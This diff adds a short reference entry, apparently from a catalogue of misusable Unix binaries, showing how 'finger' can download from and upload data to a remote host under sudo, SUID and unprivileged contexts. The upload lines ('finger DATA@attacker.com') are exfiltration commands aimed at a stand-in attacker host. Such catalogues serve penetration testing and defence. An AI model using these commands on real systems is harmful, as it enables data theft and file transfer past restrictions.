@@ -1,0 +1,32 @@
+finger
+======
+
+Download
+--------
+
+[Sudo]
+    finger x@attacker.com
+    The command hangs waiting for the remote peer to close the socket.
+
+[SUID]
+    finger x@attacker.com
+    The command hangs waiting for the remote peer to close the socket.
+
+[Unprivileged]
+    finger x@attacker.com
+    The command hangs waiting for the remote peer to close the socket.
+
+Upload
+------
+
+[Sudo]
+    finger DATA@attacker.com
+    The command hangs waiting for the remote peer to close the socket.
+
+[SUID]
+    finger DATA@attacker.com
+    The command hangs waiting for the remote peer to close the socket.
+
+[Unprivileged]
+    finger DATA@attacker.com
+    The command hangs waiting for the remote peer to close the socket.
